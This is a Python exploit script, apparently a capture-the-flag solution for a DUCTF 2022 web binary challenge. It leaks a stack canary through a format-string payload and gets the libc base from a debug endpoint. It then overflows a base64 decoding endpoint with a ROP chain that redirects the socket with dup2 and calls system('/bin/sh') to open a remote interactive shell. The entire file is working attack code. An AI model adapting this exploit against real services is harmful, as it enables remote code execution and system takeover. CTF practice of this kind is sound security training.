import binascii
import requests
import base64
import json
from pwn import *

def tohex(data):
	return binascii.hexlify(data)

libc = ELF('./libc-2.31.so')
s = requests.Session()

# host = 'localhost'
# port = 9999
# url = f'http://{host}:{port}/'

host = 'pwn-lowlevelweb-f3b95d58fe8809b4.2022.ductf.dev'
port = 443
url = f'https://{host}/'

payload = b''
for i in range(133, 136):
	payload += '%{}$p-'.format(str(i)).encode()

r = s.post(url + 'hex_to_base64', data={'data': tohex(payload)})
y = json.loads(r.text)

leak = base64.b64decode(y['data']).decode()
canary = int(leak[:leak.find('-')], 16)
print(f'[+] canary: {hex(canary)}')

r = s.get(url + 'debug')
res = r.text

libc.address = int(res[:res.find('/usr/lib/x86_64-linux-gnu/libc-2.31.so')].split('\n')[-1].split('-')[0], 16)
print(f'[+] libc_base: {hex(libc.address)}')

pop_rdi = libc.address + 0x23b6a
pop_rsi = libc.address + 0x2601f
pop_rdx = libc.address + 0x142c92
bin_sh = next(libc.search(b'/bin/sh'))
system = libc.sym['system']
open_ = libc.sym['open']
read = libc.sym['read']
write = libc.sym['write']
dup2 = libc.sym['dup2']

fd = 20					# remote
# fd = 22				# local

payload = b''

pl = b'a'*504
pl += p64(canary)
pl += b'a'*0x38

pl += p64(pop_rdi)
pl += p64(fd)
pl += p64(pop_rsi)
pl += p64(0)
pl += p64(dup2)
pl += p64(pop_rsi)
pl += p64(1)
pl += p64(dup2)
pl += p64(pop_rsi)
pl += p64(2)
pl += p64(dup2)
pl += p64(pop_rdi)
pl += p64(bin_sh)
pl += p64(system)

payload = base64.b64encode(pl).decode('utf-8')

data = f'{{"data":"{payload}"}}'

# p = remote(host, port)
p = remote(host, port, ssl=True)
req = (
	f'POST /base64_to_hex HTTP/1.1\n'
	f'Host: {host}\n'
	f'Content-Type: application/json\n'
	f'Content-Length: {len(data)}\n\n'
	f'{data}'
)
print(req)

p.send(req.encode())

p.interactive()